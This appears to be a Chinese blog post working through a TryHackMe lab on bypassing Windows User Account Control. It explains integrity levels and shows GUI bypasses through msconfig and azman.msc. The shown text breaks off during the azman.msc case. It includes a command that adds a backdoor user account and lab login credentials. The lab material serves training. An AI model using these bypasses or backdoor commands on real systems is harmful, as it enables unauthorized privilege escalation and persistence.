xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 1.05rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 1.05rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 1.05rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 1.05rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 1.05rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 1.05rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 1.05rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 1.05rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 1.05rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 1.05rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 1.05rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 1.05rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 1.05rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 1.05rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 1.05rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/08/"><span class="card-archive-list-date">八月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">16</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/06/"><span class="card-archive-list-date">六月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">7</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">18</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/TryHackMe/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>TryHackMe</span></a></span></div></div><h1 class="post-title" itemprop="name headline">THM-ByPass_UAC</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2024-08-12T07:54:09.475Z" title="更新于 2024-08-12 15:54:09">2024-08-12</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">9k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>30分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="THM-ByPass_UAC"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为太原"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>太原</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/08/08/thm-bypass-uac/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/08/08/thm-bypass-uac/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://hybcx.xyz/2024/08/08/thm-bypass-uac/"><header><a class="post-meta-categories" href="/categories/TryHackMe/" itemprop="url">TryHackMe</a><a href="/tags/TryHackMe/" tabindex="-1" itemprop="url">TryHackMe</a><h1 id="CrawlerTitle" itemprop="name headline">THM-ByPass_UAC</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">hybcx</span><time itemprop="dateCreated datePublished" datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time><time itemprop="dateCreated datePublished" datetime="2024-08-12T07:54:09.475Z" title="更新于 2024-08-12 15:54:09">2024-08-12</time></header><p>了解在 Windows 主机中绕过用户帐户控制 (UAC) 的常见方法。</p>
<h1 id="0x01-简介">0x01 简介</h1>
<p>在这个房间中，我们将研究绕过 Windows 系统可用的安全功能（称为**用户帐户控制 (&nbsp;UAC&nbsp;)）的常见方法。此功能允许任何进程以低权限运行，而与运行它的人（普通用户或管理员）无关。</p>
<p>从攻击者的角度来看，绕过UAC对于突破高度限制的环境并完全提升目标主机的权限至关重要。在学习绕过技术的同时，我们还将研究蓝队可以检测到的任何可能触发的警报以及可能在目标系统上创建的工件。</p>
<h2 id="房间目标">房间目标</h2>
<ul>
<li>了解攻击者可用于绕过UAC 的不同技术。</li>
</ul>
<h2 id="房间先决条件">房间先决条件</h2>
<p>建议在此之前先浏览一下<a target="_blank" rel="noopener" href="https://tryhackme.com/room/windowsinternals">Windows Internals</a>房间。</p>
<h1 id="0x02-uac">0x02 UAC</h1>
<h2 id="什么是uac">什么是UAC</h2>
<p>用户帐户控制 (UAC) 是一项 Windows 安全功能，默认情况下强制任何新进程在非特权帐户的安全上下文中运行。此策略适用于任何用户（包括管理员本身）启动的进程。我们的想法是，我们不能仅仅依靠用户的身份来确定某些操作是否应该被授权。</p>
<p>尽管这似乎有悖常理，但想象一下用户 BOB 不知不觉地从 Internet 下载恶意应用程序的情况。如果 BOB 是管理员组的一部分，则他启动的任何应用程序都将继承其访问令牌权限。因此，如果 BOB 决定启动恶意应用程序并且禁用UAC&nbsp;，恶意应用程序将立即获得管理员权限。相反，当启用UAC时，恶意应用程序将被限制为非管理访问令牌。</p>
<h2 id="uac-提权">UAC 提权</h2>
<p>如果管理员需要执行特权任务，&nbsp;UAC提供了一种提升权限的方法。<strong>提升的</strong>工作原理是向用户显示一个简单的对话框，以确认他们明确批准在管理安全上下文中运行应用程序：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543653.png" alt></p>
<h2 id="完整性级别">完整性级别</h2>
<p>UAC 是一种强制完整性控制 (MIC) 机制，它通过为每个用户、进程和资源分配一个完整性级别 (IL) 来区分它们。一般来说，具有较高 IL 访问令牌的用户或进程可以访问具有相同或更低 IL 的资源。MIC 的优先级高于常规的 Windows DACL（访问控制列表），因此，即使根据 DACL 您被授权访问某个资源，但如果您的 IL 不够高，也无法访问该资源。</p>
<p>Windows 使用以下 4 个 IL，按从低到高的顺序排列：</p>
<table>
<thead>
<tr>
<th>完整性级别</th>
<th>使用</th>
</tr>
</thead>
<tbody>
<tr>
<td>Low</td>
<td>一般用于与 Internet（即 Internet Explorer）交互。权限非常有限。</td>
</tr>
<tr>
<td>Medium</td>
<td>分配给标准用户和管理员的过滤令牌。</td>
</tr>
<tr>
<td>High</td>
<td>在启用了 UAC 的情况下，管理员使用提升的令牌。如果 UAC 被禁用，所有管理员将始终使用高完整性级别 (IL) 令牌。</td>
</tr>
<tr>
<td>System</td>
<td>保留供系统使用。</td>
</tr>
</tbody>
</table>
<p>当进程需要访问资源时，它将继承调用用户的访问令牌及其关联的 IL。如果一个进程分叉一个子进程，也会发生同样的情况。</p>
<h2 id="过滤后的令牌">过滤后的令牌</h2>
<p>为了实现这种角色分离，&nbsp;UAC在登录期间以稍微不同的方式对待普通用户和管理员：</p>
<ul>
<li><strong>非管理员</strong>在登录时将收到一个访问令牌，该令牌将用于用户执行的所有任务。该令牌具有中等 IL。</li>
<li><strong>管理员</strong>将收到两个访问令牌：
<ul>
<li>**过滤的令牌：剥离了管理员权限的令牌，用于常规操作。该代币具有中等 IL。</li>
<li>**提升的令牌：具有完全管理员权限的令牌，在需要使用管理权限运行某些内容时使用。该令牌具有高 IL。</li>
</ul>
</li>
</ul>
<p>通过这种方式，管理员将使用他们的过滤令牌，除非他们通过UAC明确请求管理权限。</p>
<h2 id="用常规的方式打开应用程序">用常规的方式打开应用程序</h2>
<p>当尝试打开常规控制台时，我们可以以非特权用户或管理员身份打开它。根据我们的选择，中或高完整性级别令牌将被分配给生成的进程：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543654.png" alt></p>
<p>如果我们使用 Process Hacker 分析这两个进程，我们可以看到关联的标记及其差异：<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543655.png" alt></p>
<p>左侧是一个具有中等完整性级别 (IL) 的过滤令牌，并且几乎没有分配任何权限。右侧的进程运行在高完整性级别 (IL) 下，并且具有更多可用的权限。另一个可能不太明显的区别是，中等完整性级别的进程实际上被拒绝了任何与属于管理员组相关的权限。</p>
<h2 id="uac-设置">UAC 设置</h2>
<p>根据我们的安全要求，&nbsp;UAC可以配置为在四种不同的通知级别运行：</p>
<ul>
<li>**始终通知：在更改 Windows 设置或程序尝试安装应用程序或对计算机进行更改时，通知并提示用户授权。</li>
<li>**仅当程序尝试对我的计算机进行更改时通知我：当程序尝试安装应用程序或对计算机进行更改时，通知并提示用户进行授权。更改 Windows 设置时不会提示管理员。</li>
<li>**仅当程序尝试对我的计算机进行更改时通知我（不要使我的桌面变暗）：与上面相同，但不会在安全桌面上运行UAC提示符。</li>
<li>**从不通知：禁用UAC提示。管理员将使用高权限令牌来运行一切。</li>
</ul>
<p>默认情况下，&nbsp;UAC配置为“<em>仅当程序尝试对我的计算机进行更改时通知我</em>”级别：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543656.png" alt></p>
<p>从攻击者的角度来看，前三个较低的安全级别是等效的，只有“始终通知”设置会有所不同。</p>
<h2 id="uac-内部机制">UAC 内部机制</h2>
<p>UAC的核心是<strong>应用程序信息服务</strong>或<strong>Appinfo</strong>&nbsp;。每当用户需要提升权限时，就会发生以下情况：</p>
<ol>
<li>用户请求以管理员身份运行应用程序。</li>
<li>使用 runas 动词进行 ShellExecute API 调用。</li>
<li>该请求被转发到 Appinfo 来处理提升。</li>
<li>检查应用程序清单以查看是否允许自动提升（稍后将详细介绍）。</li>
<li>Appinfo 执行<strong>consent.exe</strong>&nbsp;，这会在<strong>安全桌面</strong>上显示UAC提示符。安全桌面只是一个单独的桌面，它将进程与实际用户桌面中运行的任何进程隔离开来，以避免其他进程以任何方式篡改UAC提示符。</li>
<li>如果用户同意以管理员身份运行应用程序，Appinfo 服务将使用用户的提升令牌执行请求。然后，Appinfo 将设置新进程的父进程 ID，以指向请求提升的 shell。</li>
</ol>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543657.png" alt></p>
<h2 id="bypass-uac">ByPass UAC</h2>
<p>从攻击者的角度来看，在某些情况下，您可能会通过 Powershell 或 cmd.exe 获得 Windows 主机的远程 shell。您甚至可以通过属于管理员组的帐户获得访问权限，但是当您尝试创建后门用户以供将来访问时，您会收到以下错误：</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\attacker&gt; net user backdoor Backd00<span class="hljs-built_in">r</span> /add
System error <span class="hljs-number">5</span> has occurred.

Access is denied.</code></pre>
<p>通过检查分配的组，我们可以确认我们的会话正在以中等 IL 运行，这意味着我们正在有效地使用过滤后的令牌：</p>
<pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\attacker&gt; whoami /groups
	
<span class="hljs-built_in">GROUP</span> INFORMATION
<span class="hljs-literal">-----------------</span>

<span class="hljs-built_in">Group</span> Name                                                    Attributes
============================================================= ==================================================
Everyone                                                      Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>
NT AUTHORITY\Local account and member of Administrators <span class="hljs-built_in">group</span> <span class="hljs-built_in">Group</span> used <span class="hljs-keyword">for</span> deny only
BUILTIN\Administrators                                        <span class="hljs-built_in">Group</span> used <span class="hljs-keyword">for</span> deny only
BUILTIN\Users                                                 Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>
NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>
NT AUTHORITY\INTERACTIVE                                      Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>
NT AUTHORITY\Authenticated Users                              Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>
NT AUTHORITY\This Organization                                Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>
NT AUTHORITY\Local account                                    Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>
LOCAL                                                         Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>
NT AUTHORITY\NTLM Authentication                              Mandatory <span class="hljs-built_in">group</span>, Enabled by default, Enabled <span class="hljs-built_in">group</span>
Mandatory Label\Medium Mandatory Level</code></pre>
<p>即使我们与管理用户建立 Powershell 会话，&nbsp;UAC也会阻止我们执行任何管理任务，因为我们当前仅使用过滤后的令牌。如果我们想完全控制我们的目标，我们必须绕过UAC&nbsp;。</p>
<p>有趣的是，微软并不认为 UAC 是安全边界，而是认为它只是对管理员的一种便利，以避免不必要地以管理员权限运行进程。从这个意义上说，UAC 提示更多的是提醒用户他们正在使用高权限运行，而不是阻止恶意软件或攻击者的操作。由于它不是安全边界，任何绕过技术都不被微软视为漏洞，因此其中一些绕过方法至今仍未修补。</p>
<p>一般来说，大多数绕过技术依赖于我们能够利用高 IL 流程来代表我们执行某些操作。由于高 IL 父进程创建的任何进程都将继承相同的完整性级别，因此这足以获得提升的令牌，而无需我们执行UAC提示符。</p>
<p>对于本房间中呈现的所有场景，我们假设我们可以使用管理帐户访问服务器，但只能从 Medium IL 控制台访问服务器。我们的目标始终是无需通过UAC即可访问高 IL 控制台。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543659.png" alt></p>
<h1 id="0x03-基于gui的绕过">0x03 基于GUI的绕过</h1>
<p>我们将从基于GUI 的旁路开始，因为它们提供了一种简单的方法来理解所涉及的基本概念。这些示例通常不适用于现实场景，因为它们依赖于我们能够访问图形会话，从中我们可以使用标准UAC进行提升。</p>
<p>单击“启动计算机”按钮部署VM并通过RDP或在浏览器的并排视图中连接到它：</p>
<p><code>xfreerdp /v:10.10.118.210 /u:attacker /p:Password321</code></p>
<p>这台机器将用于房间内的所有任务。</p>
<h2 id="案例研究msconfig">案例研究：msconfig</h2>
<p>我们的目标是无需通过 UAC 即可访问 High IL 命令提示符。首先，让我们从开始菜单或“运行”对话框打开 msconfig：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543660.png" alt></p>
<p>如果我们使用 Process Hacker（在桌面上可用）分析 msconfig 进程，我们会注意到一些有趣的事情。即使没有向我们显示UAC提示，msconfig 也会作为高 IL 进程运行：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543661.png" alt></p>
<p>这要归功于一种称为自动提升的功能，该功能允许特定的二进制文件在不需要用户交互的情况下提升。稍后将详细介绍这一点。</p>
<p>如果我们可以强制 msconfig 为我们生成一个 shell，则该 shell 将继承 msconfig 使用的相同访问令牌，因此作为高 IL 进程运行。通过导航到“工具”选项卡，我们可以找到一个选项来执行此操作：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543662.png" alt></p>
<p>如果我们单击 Launch，我们将获得高 IL 命令提示符，而无需以任何方式与UAC交互。</p>
<p>要检索 msconfig 标志，请使用获取的高完整性控制台执行：</p>
<pre><code class="hljs scss">C:\&gt; C:\flags\GetFlag-msconfig.exe</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543663.png" alt></p>
<h2 id="案例研究azmanmsc">案例研究：azman.msc</h2>
<p>与 msconfig 一样，azman.msc 将自动提升，无需用户交互。如果我们能找到一种方法从该进程中生成 shell，我们将绕过UAC&nbsp;。请注意，与 msconfig 不同，azman.msc 没有预期的内置方法来生成 shell。我们可以通过一点创造力轻松克服这个问题。</p>
<p>首先，让我们运行 azman.msc：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543664.png" alt></p>
<p>我们可以确认使用 Process Hacker 生成了一个高 IL 的进程。请注意，所有 .msc 文件都是从 mmc.exe（Microsoft 管理控制台）运行的：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543665.png" alt></p>
<p>要运行 shell，我们将滥用应用程序的帮助：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543666.png" alt></p>
<p>在帮助屏幕上，我们将右键单击帮助文章的任何部分，然后选择<strong>查看源代码</strong>：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543667.png" alt></p>
<p>这将生成一个记事本进程，我们可以利用它来获取 shell。为此，请转到<strong>File-&gt;Open</strong>并确保在右下角的组合框中选择<strong>所有文件</strong>。转到<code>C:\Windows\System32</code>并搜索<code>cmd.exe</code>并右键单击选择打开：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121543668.png" alt></p>
<p>这将再次绕过UAC并让我们访问高完整性命令提示符。您可以检查 Process Hacker 中的进程树，了解高完整性令牌如何从 mmc（Microsoft 管理控制台，通过 Azman 启动）一直传递到 cmd.exe：</p>
